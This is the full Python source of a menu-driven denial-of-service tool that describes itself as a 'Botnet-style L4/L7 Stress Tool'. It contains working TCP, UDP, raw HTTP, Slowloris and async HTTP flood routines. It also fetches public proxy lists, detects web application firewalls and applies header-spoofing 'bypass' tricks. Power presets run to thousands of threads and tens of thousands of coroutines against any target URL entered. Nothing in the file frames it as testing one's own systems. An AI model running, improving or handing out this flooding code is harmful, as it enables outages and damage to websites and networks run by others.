#!/usr/bin/env python3
import sys,os,subprocess,importlib,importlib.util,threading,random,socket,ssl,struct,string,time,argparse,asyncio
__version__="5.0.0"
REQUIRED={"requests":"requests","aiohttp":"aiohttp"}
def ensure_deps():
    missing={i:p for i,p in REQUIRED.items() if importlib.util.find_spec(i) is None}
    if not missing:return
    print("\n[!] Missing:",list(missing.values()))
    if input("Install? [Y/n]: ").lower() not in("","y","yes","e","evet"):sys.exit()
    for i,p in missing.items():
        print(f"  -> {p}...",end="",flush=True)
        try:subprocess.check_call([sys.executable,"-m","pip","install",p,"-q"],stdout=subprocess.DEVNULL,stderr=subprocess.PIPE);print("OK")
        except:print("FAIL");sys.exit(1)
ensure_deps()
import requests,aiohttp
from urllib.parse import urlparse

SCRIPT_DIR=os.path.dirname(os.path.abspath(__file__))
proxy_list=[]
proxy_lock=threading.Lock()
PROXY_SOURCES=[
("SpeedX HTTP","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",""),
("SpeedX S4","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt","socks4://"),
("SpeedX S5","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt","socks5://"),
("Monosans HTTP","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",""),
("Monosans S4","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt","socks4://"),
("Monosans S5","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt","socks5://"),
("ProxyScrape","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",""),
("Clarketm","https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",""),
]
def _fetch(n,u,pf):
    px=[]
    try:
        r=requests.get(u,timeout=20);r.raise_for_status()
        for ln in r.text.strip().splitlines():
            ln=ln.strip()
            if not ln or ln.startswith("#") or ":" not in ln:continue
            p=(pf+ln) if pf and not ln.startswith("socks") else ln
            if not p.startswith(("http://","https://","socks4://","socks5://")):p="http://"+p
            px.append(p)
    except:pass
    return px
def update_proxies():
    global proxy_list
    print("\n[*] Fetching proxies...")
    res={};threads=[]
    def w(i,n,u,p):res[i]=_fetch(n,u,p)
    for i,(n,u,p) in enumerate(PROXY_SOURCES):
        t=threading.Thread(target=w,args=(i,n,u,p));t.start();threads.append(t)
    for t in threads:t.join(timeout=30)
    all_p=[]
    for i,(n,_,_) in enumerate(PROXY_SOURCES):
        got=res.get(i,[]);print(f"  [{n:<20}] {len(got) if got else 'FAIL'}");all_p.extend(got)
    proxy_list=list(dict.fromkeys(all_p))
    pf=os.path.join(SCRIPT_DIR,"proxies.txt")
    if proxy_list:
        open(pf,"w").writelines(p+"\n" for p in proxy_list)
        print(f"[+] {len(proxy_list)} proxies saved")
    elif os.path.exists(pf):
        proxy_list=[l.strip() for l in open(pf) if l.strip() and not l.startswith("#")]
        print(f"[*] Cached: {len(proxy_list)}")
    else:print("[!] No proxies")
def gp():
    if not proxy_list:return None
    with proxy_lock:return random.choice(proxy_list)
def pd(p):return{"http":p,"https":p} if p else None

UAS=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Firefox/122.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/121.0.0.0 Safari/537.36","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)","Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) AppleWebKit/605.1.15 Safari/604.1"]
REFS=["https://www.google.com/","https://www.bing.com/","https://www.yahoo.com/",""]
def _rs(n=8):return"".join(random.choices(string.ascii_lowercase+string.digits,k=n))
def _rip():return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
def bh(waf=None):
    h={"User-Agent":random.choice(UAS),"Accept":"text/html,*/*","Accept-Language":"en-US,en;q=0.9","Cache-Control":"no-cache","Referer":random.choice(REFS),"X-Forwarded-For":_rip(),"X-Real-IP":_rip()}
    if waf=="Cloudflare":h["CF-Connecting-IP"]=_rip()
    elif waf in("AWS WAF","Akamai"):h["X-Forwarded-For"]="127.0.0."+str(random.randint(1,254));h["X-Original-URL"]="/"
    return h

WAF_SIG={"Cloudflare":(["cf-ray","cf-cache-status"],["__cf_bm","cf_clearance"],["cloudflare","ray id"]),"AWS WAF":(["x-amzn-requestid"],["awsalb"],["request blocked"]),"Akamai":(["x-akamai-transformed"],["ak_bmsc"],["reference#"]),"Sucuri":(["x-sucuri-id"],["sucuri_cloudproxy"],["sucuri"]),"Imperva":(["x-iinfo"],["incap_ses"],["incapsula"]),"ModSecurity":([],[],["modsecurity"]),"Wordfence":([],["wfvt_"],["wordfence"]),"DDoS-Guard":([],["__ddg1"],["ddos-guard"]),"Cloudfront":(["x-amz-cf-id"],[],["amazon cloudfront"])}
def detect_waf(r):
    if not r:return[]
    hd={k.lower():v.lower() for k,v in r.headers.items()};ck={k.lower():v for k,v in r.cookies.items()};bd=r.text.lower()[:5000];det=[]
    for nm,(hs,cs,bs) in WAF_SIG.items():
        sc=sum(2 for h in hs if h in hd)+sum(3 for c in cs for cn in ck if c in cn)+sum(2 for b in bs if b in bd)+(1 if r.status_code in(403,503) else 0)
        if sc>=3:det.append((nm,sc))
    return sorted(det,key=lambda x:x[1],reverse=True)
def scan_waf(url):
    res={"detected":[],"status":None,"server":"?"}
    try:r=requests.get(url,timeout=10);res["status"]=r.status_code;res["server"]=r.headers.get("Server","?");[res["detected"].append((w,s)) for w,s in detect_waf(r) if w not in[x[0] for x in res["detected"]]]
    except:pass
    return res

stats={"total":0,"ok":0,"fail":0}
stop_ev=threading.Event()
detected_waf=None

# ═══════════════════════════════════
#  LAYER 4 - TCP/UDP/RAW
# ═══════════════════════════════════
def l4_tcp(host,port):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(4)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_LINGER,struct.pack("ii",1,0))
        s.connect((host,port));s.send(random._urandom(random.randint(64,1400)));s.close();return True
    except:
        try:s.close()
        except:pass
        return False
def l4_udp(host,port):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.sendto(random._urandom(random.randint(64,65500)),(host,port));s.close();return True
    except:
        try:s.close()
        except:pass
        return False
def l4_raw_http(host,port,path,use_ssl):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(5)
        if use_ssl:ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;s=ctx.wrap_socket(s,server_hostname=host)
        s.connect((host,port))
        q="&".join(f"{_rs(4)}={_rs(8)}" for _ in range(random.randint(2,5)))
        req=f"GET {path}?{q} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\nX-Forwarded-For: {_rip()}\r\nConnection: keep-alive\r\n\r\n"
        s.send(req.encode());s.close();return True
    except:
        try:s.close()
        except:pass
        return False
def l4_raw_post(host,port,path,use_ssl):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(5)
        if use_ssl:ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;s=ctx.wrap_socket(s,server_hostname=host)
        s.connect((host,port))
        body="&".join(f"{_rs(6)}={_rs(random.randint(10,60))}" for _ in range(random.randint(3,8)))
        req=f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\nX-Forwarded-For: {_rip()}\r\nConnection: keep-alive\r\n\r\n{body}"
        s.send(req.encode());s.close();return True
    except:
        try:s.close()
        except:pass
        return False
def l4_slowloris(host,port):
    socks=[]
    while not stop_ev.is_set():
        for _ in range(random.randint(10,30)):
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(10);s.connect((host,port))
                s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\nConnection: keep-alive\r\nKeep-Alive: {random.randint(300,1200)}\r\nContent-Length: {random.randint(100,10000)}\r\n".encode())
                socks.append(s);stats["total"]+=1;stats["ok"]+=1
            except:stats["fail"]+=1
        alive=[]
        for s in socks:
            try:s.send(f"X-a: {random.randint(1,9999)}\r\n".encode());alive.append(s)
            except:
                stats["fail"]+=1
                try:s.close()
                except:pass
        socks=alive
        time.sleep(random.uniform(5,15))
    for s in socks:
        try:s.close()
        except:pass

def tw_tcp(host,port):
    while not stop_ev.is_set():
        ok=l4_tcp(host,port);stats["total"]+=1
        if ok:stats["ok"]+=1
        else:stats["fail"]+=1
def tw_udp(host,port):
    while not stop_ev.is_set():
        ok=l4_udp(host,port);stats["total"]+=1
        if ok:stats["ok"]+=1
        else:stats["fail"]+=1
def tw_raw(host,port,path,ssl_,m):
    while not stop_ev.is_set():
        ok=(l4_raw_post if m=="POST" else(lambda h,p,pa,s:l4_raw_http(h,p,pa,s) if random.random()<.6 else l4_raw_post(h,p,pa,s)) if m=="MIX" else l4_raw_http)(host,port,path,ssl_)
        stats["total"]+=1
        if ok:stats["ok"]+=1
        else:stats["fail"]+=1

# ═══════════════════════════════════
#  LAYER 7 - HTTP APPLICATION
# ═══════════════════════════════════
async def l7_async_req(session,url,waf,method="GET"):
    try:
        h=bh(waf);p=urlparse(url)
        path=p.path or "/"
        mutations=[lambda x:x,lambda x:x+"?"+_rs(5)+"="+_rs(10),lambda x:x+"/"+_rs(4),lambda x:x+";jsid="+_rs(32)]
        target=f"{p.scheme}://{p.netloc}{random.choice(mutations)(path)}"
        sep="&" if "?" in target else "?";target+=f"{sep}_={_rs(6)}"
        to=aiohttp.ClientTimeout(total=8)
        if method=="POST":
            async with session.post(target,headers=h,data={_rs(5):_rs(20) for _ in range(4)},timeout=to,ssl=False) as r:await r.read();return r.status<400
        elif method=="HEAD":
            async with session.head(target,headers=h,timeout=to,ssl=False) as r:return r.status<400
        else:
            async with session.get(target,headers=h,timeout=to,ssl=False) as r:await r.read();return r.status<400
    except:return False
async def l7_worker(session,url,waf,methods):
    while not stop_ev.is_set():
        ok=await l7_async_req(session,url,waf,random.choice(methods))
        stats["total"]+=1
        if ok:stats["ok"]+=1
        else:stats["fail"]+=1
async def l7_run(url,count,waf,methods):
    conn=aiohttp.TCPConnector(limit=0,limit_per_host=0,ttl_dns_cache=300,force_close=False,keepalive_timeout=30)
    async with aiohttp.ClientSession(connector=conn) as s:
        await asyncio.gather(*[asyncio.ensure_future(l7_worker(s,url,waf,methods)) for _ in range(count)],return_exceptions=True)
def l7_thread(url,count,waf,methods):
    loop=asyncio.new_event_loop();asyncio.set_event_loop(loop)
    try:loop.run_until_complete(l7_run(url,count,waf,methods))
    except:pass
    finally:loop.close()

# ═══════════════════════════════════
#  MONITOR
# ═══════════════════════════════════
def monitor():
    start=time.time();prev=0
    while not stop_ev.is_set():
        time.sleep(1);t=stats["total"]
        if t>prev:
            el=time.time()-start;rps=t/el if el>0 else 0;sr=stats["ok"]/t*100 if t else 0
            print(f"  >> {t:>9,} | {rps:>8.0f}/s | OK:{sr:>5.1f}% | WAF:{detected_waf or'-'}")
            prev=t

# ═══════════════════════════════════
#  MENU
# ═══════════════════════════════════
BANNER=r"""
 ██████╗  ██████╗  ██████╗ ████████╗    ██████╗ ██╗   ██╗
 ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔══██╗╚██╗ ██╔╝
 ██████╔╝██║   ██║██║   ██║   ██║       ██████╔╝ ╚████╔╝ 
 ██╔══██╗██║   ██║██║   ██║   ██║       ██╔═══╝   ╚██╔╝  
 ██║  ██║╚██████╔╝╚██████╔╝   ██║       ██║        ██║   
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝   ╚═╝       ╚═╝        ╚═╝   
"""
L4_METHODS={"1":("TCP Flood","tcp"),"2":("UDP Flood","udp"),"3":("Raw HTTP GET","raw-get"),"4":("Raw HTTP POST","raw-post"),"5":("Raw Mixed GET+POST","raw-mix"),"6":("Slowloris (hold connections)","slowloris")}
L7_METHODS={"1":("Async GET Flood","async-get"),"2":("Async POST Flood","async-post"),"3":("Async Mixed GET/POST/HEAD","async-mix"),"4":("Async + Raw Combo (MAX)","combo")}
PP={"1":("Low",50,500),"2":("Medium",200,2000),"3":("High",500,5000),"4":("Extreme",1000,10000),"5":("MAX",2000,20000)}
def cls():os.system("cls" if os.name=="nt" else "clear")
def show_menu():
    cls();print(BANNER)
    print(f"  v{__version__} | {'='*44}")
    print("  [1] Layer 4 Attack  (TCP/UDP/RAW Socket)")
    print("  [2] Layer 7 Attack  (HTTP/HTTPS App Layer)")
    print("  [3] Update Proxies")
    print("  [4] WAF Scanner")
    print("  [0] Exit")
    print("  "+"="*46)
def show_l4():
    cls();print(BANNER);print("  LAYER 4 METHODS\n  "+"-"*44)
    for k,(n,_) in L4_METHODS.items():print(f"  [{k}] {n}")
    print("  [0] Back")
def show_l7():
    cls();print(BANNER);print("  LAYER 7 METHODS\n  "+"-"*44)
    for k,(n,_) in L7_METHODS.items():print(f"  [{k}] {n}")
    print("  [0] Back")
def show_power():
    cls();print(BANNER);print("  POWER LEVEL\n  "+"-"*44)
    for k,(n,t,a) in PP.items():print(f"  [{k}] {n:<10} Threads:{t:<6} Async:{a}")
    print("  [6] Custom")
    print("  [0] Back")
def get_target():
    url=input("\n  Target URL: ").strip()
    if not url.startswith("http"):url="http://"+url
    if url.count("/")==2:url+="/"
    return url
def run_attack(layer,method,url,tc,ac):
    global detected_waf
    stats.update({"total":0,"ok":0,"fail":0});stop_ev.clear()
    p=urlparse(url);host=p.hostname;port=p.port or(443 if p.scheme=="https" else 80);path=p.path or"/";use_ssl=p.scheme=="https"
    print(f"\n  [*] WAF Scan...")
    wr=scan_waf(url)
    print(f"  Server: {wr['server']} | Status: {wr['status']}")
    if wr["detected"]:
        detected_waf=wr["detected"][0][0]
        print(f"  [!] WAF: {', '.join(f'{n}(score:{s})' for n,s in wr['detected'][:3])}")
        print(f"  [*] Bypass loaded for: {detected_waf}")
    else:print("  [+] No WAF detected")
    print(f"\n  {'='*46}")
    print(f"  Layer   : {layer}")
    print(f"  Method  : {method}")
    print(f"  Target  : {url}")
    print(f"  Threads : {tc}")
    print(f"  Async   : {ac}")
    print(f"  Proxies : {len(proxy_list)}")
    print(f"  WAF     : {detected_waf or 'None'}")
    print(f"  {'='*46}")
    print("  Press Ctrl+C to stop\n")
    threading.Thread(target=monitor,daemon=True).start()
    try:
        if layer==4:
            if method=="tcp":[threading.Thread(target=tw_tcp,args=(host,port),daemon=True).start() for _ in range(tc)]
            elif method=="udp":[threading.Thread(target=tw_udp,args=(host,port),daemon=True).start() for _ in range(tc)]
            elif method=="raw-get":[threading.Thread(target=tw_raw,args=(host,port,path,use_ssl,"GET"),daemon=True).start() for _ in range(tc)]
            elif method=="raw-post":[threading.Thread(target=tw_raw,args=(host,port,path,use_ssl,"POST"),daemon=True).start() for _ in range(tc)]
            elif method=="raw-mix":[threading.Thread(target=tw_raw,args=(host,port,path,use_ssl,"MIX"),daemon=True).start() for _ in range(tc)]
            elif method=="slowloris":[threading.Thread(target=l4_slowloris,args=(host,port),daemon=True).start() for _ in range(tc)]
            while not stop_ev.is_set():time.sleep(1)
        else:
            methods_map={"async-get":["GET"],"async-post":["POST"],"async-mix":["GET","POST","HEAD"]}
            if method=="combo":
                threading.Thread(target=l7_thread,args=(url,ac,detected_waf,["GET","POST","HEAD"]),daemon=True).start()
                [threading.Thread(target=tw_raw,args=(host,port,path,use_ssl,"MIX"),daemon=True).start() for _ in range(tc//2)]
                [threading.Thread(target=tw_tcp,args=(host,port),daemon=True).start() for _ in range(tc//4)]
                while not stop_ev.is_set():time.sleep(1)
            else:
                ms=methods_map.get(method,["GET"])
                l7_thread(url,ac,detected_waf,ms)
    except KeyboardInterrupt:
        stop_ev.set()
    t=stats["total"];sr=stats["ok"]/t*100 if t else 0
    print(f"\n  {'='*46}\n  RESULTS: {t:,} sent | OK:{sr:.1f}% | Fail:{stats['fail']:,}\n  {'='*46}")
    input("  Press Enter to continue...")

def interactive_menu():
    update_proxies()
    while True:
        show_menu();ch=input("\n  Select: ").strip()
        if ch=="0":print("  Bye!");sys.exit(0)
        elif ch=="3":update_proxies();input("  Done. Enter to continue...")
        elif ch=="4":
            url=get_target();wr=scan_waf(url)
            print(f"\n  Server: {wr['server']} | Status: {wr['status']}")
            if wr["detected"]:
                for n,s in wr["detected"]:print(f"  [!] {n} (score:{s})")
            else:print("  [+] No WAF")
            input("  Enter to continue...")
        elif ch in("1","2"):
            layer=int(ch)
            if layer==4:show_l4();methods=L4_METHODS;mch=input("\n  Method: ").strip()
            else:show_l7();methods=L7_METHODS;mch=input("\n  Method: ").strip()
            if mch=="0":continue
            if mch not in methods:print("  Invalid");continue
            mname,mkey=methods[mch]
            url=get_target()
            show_power();pch=input("\n  Power: ").strip()
            if pch=="0":continue
            if pch=="6":
                tc=int(input("  Threads: ").strip() or "200")
                ac=int(input("  Async coroutines: ").strip() or "2000")
            elif pch in PP:
                _,tc,ac=PP[pch]
            else:tc=200;ac=2000
            run_attack(layer,mkey,url,tc,ac)

def main():
    import argparse
    ap=argparse.ArgumentParser(prog="root.py",description=f"Botnet-style L4/L7 Stress Tool v{__version__}",epilog="Run without args for interactive menu")
    ap.add_argument("url",nargs="?");ap.add_argument("--layer",choices=["4","7"],default="7")
    ap.add_argument("-m","--method",default="async-mix")
    ap.add_argument("-t","--threads",type=int,default=200);ap.add_argument("-a","--async-count",type=int,default=2000)
    ap.add_argument("--power",choices=["low","medium","high","extreme","max"])
    ap.add_argument("--no-proxy",action="store_true");ap.add_argument("--update-proxies",action="store_true")
    ap.add_argument("-v","--version",action="version",version=f"v{__version__}")
    args=ap.parse_args()
    if args.update_proxies:update_proxies();sys.exit(0)
    if not args.url:interactive_menu();return
    if not args.no_proxy:update_proxies()
    pp={"low":(50,500),"medium":(200,2000),"high":(500,5000),"extreme":(1000,10000),"max":(2000,20000)}
    tc,ac=(pp[args.power] if args.power else (args.threads,args.async_count))
    run_attack(int(args.layer),args.method,args.url,tc,ac)

if __name__=="__main__":main()
